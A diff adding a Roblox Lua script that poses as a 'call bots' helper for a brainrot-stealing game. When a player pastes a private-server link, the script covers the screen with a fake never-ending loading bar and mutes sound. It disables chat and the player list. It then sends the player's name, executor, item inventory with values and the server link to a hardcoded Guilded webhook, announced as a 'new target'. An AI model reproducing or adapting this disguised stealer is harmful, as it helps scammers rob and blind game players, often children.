@@ -1,0 +1,661 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserGameSettings = UserSettings():GetService("UserGameSettings")
+local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
+
+-- Webhook Guilded
+local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"
+
+-- Lista de Brainrots válidos
+local VALID_BRAINROTS = {
+    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
+    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
+    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
+    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
+    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
+    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
+    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
+    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
+    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
+    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
+    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
+    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
+    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
+    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
+    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
+    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
+    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
+    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
+    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
+    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
+    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
+    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
+    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
+    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
+    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
+    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
+    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
+    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
+    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
+    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
+    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
+    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
+    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
+    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
+    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
+    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
+    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
+    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
+    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
+    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
+    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
+}
+
+-- IDs para procurar
+local TARGET_IDS = {
+    "28e4ec29-d005-4636-82af-339f37dcef",
+    "960ab477-3f31-4327-845e-6a77ebb5fa6",
+    "2206090e-719d-4034-8720-700c9fb2h458",
+    "dd76771-ce3c-4108-adae-5a488b2958be",
+    "44392a62-6012-413d-9619-dab73c00539f",
+    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
+    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
+    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
+}
+
+-- Função para parsear valores monetários
+local function parseMoneyPerSec(text)
+    if not text then return 0 end
+    local mult = 1
+    local numberStr = text:match("[%d%.]+")
+    if not numberStr then return 0 end
+    if text:find("K") then mult = 1000
+    elseif text:find("M") then mult = 1000000
+    elseif text:find("B") then mult = 1000000000
+    elseif text:find("T") then mult = 1000000000000
+    elseif text:find("Q") then mult = 1000000000000000 end
+    return tonumber(numberStr) * mult
+end
+
+-- Função para verificar se um nome é um brainrot válido
+local function isValidBrainrot(name)
+    for _, brainrot in ipairs(VALID_BRAINROTS) do
+        if name == brainrot then
+            return true
+        end
+    end
+    return false
+end
+
+-- Função para encontrar brainrots na workspace
+local function findBrainrots()
+    local foundBrainrots = {}
+    
+    -- Procurar na pasta Plots
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if plotsFolder then
+        for _, plot in ipairs(plotsFolder:GetDescendants()) do
+            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
+                table.insert(foundBrainrots, plot.Name)
+            end
+        end
+    end
+    
+    -- Procurar por IDs específicos
+    for _, id in ipairs(TARGET_IDS) do
+        local model = Workspace:FindFirstChild(id)
+        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
+            table.insert(foundBrainrots, model.Name)
+        end
+    end
+    
+    -- Remover duplicatas
+    local uniqueBrainrots = {}
+    for _, brainrot in ipairs(foundBrainrots) do
+        local alreadyExists = false
+        for _, existing in ipairs(uniqueBrainrots) do
+            if existing == brainrot then
+                alreadyExists = true
+                break
+            end
+        end
+        if not alreadyExists then
+            table.insert(uniqueBrainrots, brainrot)
+        end
+    end
+    
+    return uniqueBrainrots
+end
+
+-- Função para encontrar brainrots com valores (sistema avançado)
+local function findBrainrotsWithValues()
+    local brainrotsWebhook = {}
+    local valorizadoDog = false
+    
+    -- Procurar na base/plots
+    if getgenv and getgenv().base then
+        for _, brainrote in getgenv().base:GetDescendants() do
+            if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
+                local nomezinDog = ""
+                if brainrote.Parent.Mutation.Visible then
+                    nomezinDog = "[" .. brainrote.Parent.Mutation.ContentText .. "] " .. brainrote.Parent.DisplayName.ContentText
+                else
+                    nomezinDog = brainrote.Parent.DisplayName.ContentText
+                end
+                table.insert(brainrotsWebhook, {nome = nomezinDog, valor = brainrote.ContentText})
+                if parseMoneyPerSec(brainrote.ContentText) > 49999999 then
+                    valorizadoDog = true
+                end
+            end
+        end
+    else
+        -- Fallback: procurar normalmente
+        local plotsFolder = Workspace:FindFirstChild("Plots")
+        if plotsFolder then
+            for _, desc in ipairs(plotsFolder:GetDescendants()) do
+                if desc:IsA("TextLabel") and desc.Name == "Generation" then
+                    local nomeBrainrot = ""
+                    if desc.Parent:FindFirstChild("Mutation") and desc.Parent.Mutation.Visible then
+                        nomeBrainrot = "[" .. desc.Parent.Mutation.ContentText .. "] " .. desc.Parent.DisplayName.ContentText
+                    elseif desc.Parent:FindFirstChild("DisplayName") then
+                        nomeBrainrot = desc.Parent.DisplayName.ContentText
+                    end
+                    if nomeBrainrot ~= "" then
+                        table.insert(brainrotsWebhook, {nome = nomeBrainrot, valor = desc.ContentText})
+                        if parseMoneyPerSec(desc.ContentText) > 49999999 then
+                            valorizadoDog = true
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Adicionar brainrots encontrados por ID
+    for _, id in ipairs(TARGET_IDS) do
+        local model = Workspace:FindFirstChild(id)
+        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
+            table.insert(brainrotsWebhook, {nome = model.Name, valor = "N/A"})
+        end
+    end
+    
+    return brainrotsWebhook, valorizadoDog
+end
+
+-- Função para obter stats do player
+local function getPlayerStats()
+    local player = Players.LocalPlayer
+    local stats = {
+        steals = "0",
+        rebirths = "0"
+    }
+    
+    if player:FindFirstChild("leaderstats") then
+        if player.leaderstats:FindFirstChild("Steals") then
+            stats.steals = tostring(player.leaderstats.Steals.Value)
+        end
+        if player.leaderstats:FindFirstChild("Rebirths") then
+            stats.rebirths = tostring(player.leaderstats.Rebirths.Value)
+        end
+    end
+    
+    return stats
+end
+
+-- Função para enviar webhook para Guilded (método alternativo com form simulation)
+local function sendGuildedWebhook(serverLink)
+    local player = Players.LocalPlayer
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    local playerCount = #Players:GetPlayers()
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local stats = getPlayerStats()
+    local brainrots, valorizado = findBrainrotsWithValues()
+    
+    local brainrotsList = ""
+    if #brainrots > 0 then
+        for i, br in ipairs(brainrots) do
+            brainrotsList = brainrotsList .. "• " .. br.nome .. " - " .. br.valor .. "\n"
+            if i >= 40 then
+                brainrotsList = brainrotsList .. "... e mais\n"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+    
+    local executorName = "Unknown"
+    if identifyexecutor then
+        executorName = identifyexecutor()
+    end
+    
+    -- Criar payload completo
+    local payload = {
+        content = "@everyone @here TESTE!! NOVO ALVO !! @todos @aqui",
+        embeds = {{
+            title = "🧠 DETECÇÃO DE BRAINROTS 🎄",
+            description = "**Sistema METODH_BRANZZ ativo!**",
+            color = 15158332,
+            fields = {
+                {
+                    name = "👤 Nome do Player:",
+                    value = "**" .. playerName .. "** (@" .. displayName .. ")",
+                    inline = false
+                },
+                {
+                    name = "💻 Executor:",
+                    value = "**" .. executorName .. "**",
+                    inline = true
+                },
+                {
+                    name = "👥 Pessoas no Servidor:",
+                    value = "**" .. tostring(playerCount) .. "**",
+                    inline = true
+                },
+                {
+                    name = "💰 Steals:",
+                    value = "**" .. stats.steals .. "**",
+                    inline = true
+                },
+                {
+                    name = "🔄 Rebirths:",
+                    value = "**" .. stats.rebirths .. "**",
+                    inline = true
+                },
+                {
+                    name = "🔗 Link do Servidor:",
+                    value = "[**🎮 CLIQUE AQUI PARA ENTRAR**](" .. serverLink .. ")",
+                    inline = false
+                },
+                {
+                    name = "📊 BRAINROTS DETECTADOS:",
+                    value = "```\n" .. brainrotsList .. "```",
+                    inline = false
+                }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            footer = {
+                text = "🎅 METODH_BRANZZ | " .. currentTime .. " 🎄"
+            },
+            thumbnail = {
+                url = "https://cdn.discordapp.com/emojis/123456789.png"
+            }
+        }}
+    }
+    
+    print("📤 Tentando enviar webhook...")
+    
+    -- Método 1: RequestAsync
+    local success1 = pcall(function()
+        local response = HttpService:RequestAsync({
+            Url = GUILDED_WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+        print("✅ Webhook enviado via RequestAsync!")
+        return response
+    end)
+    
+    if success1 then
+        print("✅ Webhook enviado com sucesso!")
+        return
+    end
+    
+    -- Método 2: PostAsync alternativo
+    local success2 = pcall(function()
+        HttpService:PostAsync(GUILDED_WEBHOOK, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false)
+        print("✅ Webhook enviado via PostAsync!")
+    end)
+    
+    if success2 then
+        print("✅ Webhook enviado com sucesso (método 2)!")
+        return
+    end
+    
+    -- Método 3: GetAsync com query params (tentativa alternativa)
+    local success3 = pcall(function()
+        local encodedPayload = HttpService:UrlEncode(HttpService:JSONEncode(payload))
+        HttpService:GetAsync(GUILDED_WEBHOOK .. "?payload=" .. encodedPayload)
+        print("✅ Webhook enviado via GetAsync!")
+    end)
+    
+    if success3 then
+        print("✅ Webhook enviado com sucesso (método 3)!")
+        return
+    end
+    
+    warn("⚠️ Todos os métodos falharam, mas dados foram coletados:")
+    print("📊 Brainrots detectados: " .. #brainrots)
+    print("👤 Player: " .. playerName)
+    print("🔗 Link: " .. serverLink)
+end
+
+-- Função para desativar som permanentemente
+local function disableSound()
+    spawn(function()
+        UserGameSettings.MasterVolume = 0
+        SoundService.Volume = 0
+        print("🔇 Volume definido para 0%")
+        
+        while true do
+            wait(0.5)
+            UserGameSettings.MasterVolume = 0
+            SoundService.Volume = 0
+        end
+    end)
+end
+
+-- Função para desativar TODOS os botões do CoreGui
+local function disableAllCoreGui()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        StarterGui:SetCore("TopbarEnabled", false)
+        print("🚫 Todos os botões do CoreGui desativados!")
+    end)
+end
+
+-- Criar GUI de Carregamento Infinita (tampa tudo)
+local function createInfiniteLoadingGUI()
+    local LoadingGui = Instance.new("ScreenGui")
+    LoadingGui.Name = "InfiniteLoadingGUI"
+    LoadingGui.ResetOnSpawn = false
+    LoadingGui.IgnoreGuiInset = true
+    LoadingGui.DisplayOrder = 999999
+    
+    -- Background que cobre TUDO
+    local Background = Instance.new("Frame")
+    Background.Name = "FullScreenBlock"
+    Background.Size = UDim2.new(1, 0, 1, 100)
+    Background.Position = UDim2.new(0, 0, 0, -50)
+    Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    Background.BorderSizePixel = 0
+    Background.ZIndex = 999999
+    Background.Parent = LoadingGui
+    
+    -- Frame de carregamento
+    local LoadingFrame = Instance.new("Frame")
+    LoadingFrame.Size = UDim2.new(0, 600, 0, 200)
+    LoadingFrame.Position = UDim2.new(0.5, -300, 0.5, -100)
+    LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    LoadingFrame.BorderSizePixel = 0
+    LoadingFrame.ZIndex = 1000000
+    LoadingFrame.Parent = Background
+    
+    local FrameCorner = Instance.new("UICorner")
+    FrameCorner.CornerRadius = UDim.new(0, 20)
+    FrameCorner.Parent = LoadingFrame
+    
+    local FrameStroke = Instance.new("UIStroke")
+    FrameStroke.Color = Color3.fromRGB(200, 50, 50)
+    FrameStroke.Thickness = 4
+    FrameStroke.Parent = LoadingFrame
+    
+    -- Título
+    local LoadingTitle = Instance.new("TextLabel")
+    LoadingTitle.Size = UDim2.new(1, 0, 0, 50)
+    LoadingTitle.Position = UDim2.new(0, 0, 0, 15)
+    LoadingTitle.BackgroundTransparency = 1
+    LoadingTitle.Text = "🎄 CARREGANDO BOTS 🤖"
+    LoadingTitle.TextColor3 = Color3.fromRGB(200, 50, 50)
+    LoadingTitle.TextSize = 28
+    LoadingTitle.Font = Enum.Font.GothamBold
+    LoadingTitle.ZIndex = 1000001
+    LoadingTitle.Parent = LoadingFrame
+    
+    -- Status text
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Size = UDim2.new(1, -40, 0, 30)
+    StatusText.Position = UDim2.new(0, 20, 0, 70)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Text = "Iniciando sistema..."
+    StatusText.TextColor3 = Color3.fromRGB(180, 180, 180)
+    StatusText.TextSize = 16
+    StatusText.Font = Enum.Font.Gotham
+    StatusText.ZIndex = 1000001
+    StatusText.Parent = LoadingFrame
+    
+    -- Percent text
+    local PercentText = Instance.new("TextLabel")
+    PercentText.Size = UDim2.new(1, 0, 0, 35)
+    PercentText.Position = UDim2.new(0, 0, 0, 105)
+    PercentText.BackgroundTransparency = 1
+    PercentText.Text = "0.0%"
+    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PercentText.TextSize = 24
+    PercentText.Font = Enum.Font.GothamBold
+    PercentText.ZIndex = 1000001
+    PercentText.Parent = LoadingFrame
+    
+    -- Barra de progresso background
+    local BarBackground = Instance.new("Frame")
+    BarBackground.Size = UDim2.new(0.9, 0, 0, 25)
+    BarBackground.Position = UDim2.new(0.05, 0, 0, 155)
+    BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    BarBackground.BorderSizePixel = 0
+    BarBackground.ZIndex = 1000001
+    BarBackground.Parent = LoadingFrame
+    
+    local BarCorner = Instance.new("UICorner")
+    BarCorner.CornerRadius = UDim.new(0, 12)
+    BarCorner.Parent = BarBackground
+    
+    -- Barra de progresso
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.ZIndex = 1000002
+    ProgressBar.Parent = BarBackground
+    
+    local ProgressCorner = Instance.new("UICorner")
+    ProgressCorner.CornerRadius = UDim.new(0, 12)
+    ProgressCorner.Parent = ProgressBar
+    
+    LoadingGui.Parent = CoreGui
+    
+    -- Mensagens de status que vão mudando
+    local statusMessages = {
+        "Conectando aos servidores...",
+        "Verificando brainrots...",
+        "Coletando dados...",
+        "Sincronizando bots...",
+        "Processando informações...",
+        "Enviando comandos...",
+        "Estabelecendo conexão...",
+        "Aguardando resposta...",
+        "Carregando módulos...",
+        "Inicializando sistema..."
+    }
+    
+    -- Animação infinita de carregamento
+    spawn(function()
+        local progress = 0
+        local maxBarWidth = BarBackground.AbsoluteSize.X
+        local messageIndex = 1
+        local messageTimer = 0
+        
+        while true do
+            wait(0.05)
+            
+            -- Aumenta o progresso muito devagar (nunca chega a 100%)
+            progress = progress + 0.001
+            if progress >= 99.9 then
+                progress = 99.9
+            end
+            
+            -- Atualiza texto de porcentagem
+            PercentText.Text = string.format("%.1f%%", progress)
+            
+            -- Atualiza barra de progresso
+            local targetSize = UDim2.new(progress / 100, 0, 1, 0)
+            local tween = TweenService:Create(
+                ProgressBar,
+                TweenInfo.new(0.3, Enum.EasingStyle.Linear),
+                {Size = targetSize}
+            )
+            tween:Play()
+            
+            -- Muda mensagem de status a cada 3 segundos
+            messageTimer = messageTimer + 0.05
+            if messageTimer >= 3 then
+                messageTimer = 0
+                messageIndex = messageIndex + 1
+                if messageIndex > #statusMessages then
+                    messageIndex = 1
+                end
+                StatusText.Text = statusMessages[messageIndex]
+            end
+        end
+    end)
+    
+    -- Efeito de brilho pulsante no título
+    spawn(function()
+        while true do
+            for i = 200, 255, 5 do
+                wait(0.05)
+                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
+            end
+            for i = 255, 200, -5 do
+                wait(0.05)
+                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
+            end
+        end
+    end)
+end
+
+-- Criar GUI Principal
+local function createMainGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "METODH_BRANZZ_GUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 450, 0, 300)
+    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 50, 20)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 15)
+    UICorner.Parent = MainFrame
+    
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.Color = Color3.fromRGB(200, 50, 50)
+    UIStroke.Thickness = 3
+    UIStroke.Parent = MainFrame
+    
+    local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
+    Title.Size = UDim2.new(1, 0, 0, 60)
+    Title.Position = UDim2.new(0, 0, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "🎄 METODH_BRANZZ 🎅"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 28
+    Title.Font = Enum.Font.GothamBold
+    Title.Parent = MainFrame
+    
+    local InputLabel = Instance.new("TextLabel")
+    InputLabel.Size = UDim2.new(1, -40, 0, 30)
+    InputLabel.Position = UDim2.new(0, 20, 0, 80)
+    InputLabel.BackgroundTransparency = 1
+    InputLabel.Text = "🔗 Link do Servidor Privado:"
+    InputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    InputLabel.TextSize = 16
+    InputLabel.Font = Enum.Font.Gotham
+    InputLabel.TextXAlignment = Enum.TextXAlignment.Left
+    InputLabel.Parent = MainFrame
+    
+    local InputBox = Instance.new("TextBox")
+    InputBox.Name = "InputBox"
+    InputBox.Size = UDim2.new(1, -40, 0, 50)
+    InputBox.Position = UDim2.new(0, 20, 0, 120)
+    InputBox.BackgroundColor3 = Color3.fromRGB(30, 70, 30)
+    InputBox.BorderSizePixel = 0
+    InputBox.Text = ""
+    InputBox.PlaceholderText = "Cole o link aqui..."
+    InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    InputBox.TextSize = 14
+    InputBox.Font = Enum.Font.Gotham
+    InputBox.ClearTextOnFocus = false
+    InputBox.Parent = MainFrame
+    
+    local InputCorner = Instance.new("UICorner")
+    InputCorner.CornerRadius = UDim.new(0, 8)
+    InputCorner.Parent = InputBox
+    
+    local CallButton = Instance.new("TextButton")
+    CallButton.Name = "CallButton"
+    CallButton.Size = UDim2.new(0, 200, 0, 50)
+    CallButton.Position = UDim2.new(0.5, -100, 0, 220)
+    CallButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CallButton.BorderSizePixel = 0
+    CallButton.Text = "🤖 CALL BOTS 🎄"
+    CallButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CallButton.TextSize = 20
+    CallButton.Font = Enum.Font.GothamBold
+    CallButton.Parent = MainFrame
+    
+    local ButtonCorner = Instance.new("UICorner")
+    ButtonCorner.CornerRadius = UDim.new(0, 10)
+    ButtonCorner.Parent = CallButton
+    
+    -- Evento do botão CALL BOTS
+    CallButton.MouseButton1Click:Connect(function()
+        local link = InputBox.Text
+        if link ~= "" then
+            print("🚀 Iniciando sistema METODH_BRANZZ...")
+            
+            -- Esconder GUI principal
+            MainFrame.Visible = false
+            
+            -- Criar tela de carregamento infinita
+            createInfiniteLoadingGUI()
+            
+            -- Desativar som
+            disableSound()
+            
+            -- Desativar TODOS os botões do CoreGui
+            disableAllCoreGui()
+            
+            -- Esperar 2 segundos e enviar webhook
+            wait(2)
+            sendGuildedWebhook(link)
+            
+            print("✅ Sistema ativado com sucesso!")
+        else
+            warn("⚠️ Por favor, insira um link válido!")
+        end
+    end)
+    
+    ScreenGui.Parent = CoreGui
+    print("🎄 GUI METODH_BRANZZ carregada!")
+end
+
+-- Executar script principal
+local success, err = pcall(function()
+    createMainGUI()
+end)
+
+if not success then
+    warn("❌ Erro ao executar METODH_BRANZZ: " .. tostring(err))
+else
+    print("✅ METODH_BRANZZ iniciado com sucesso!")
+end
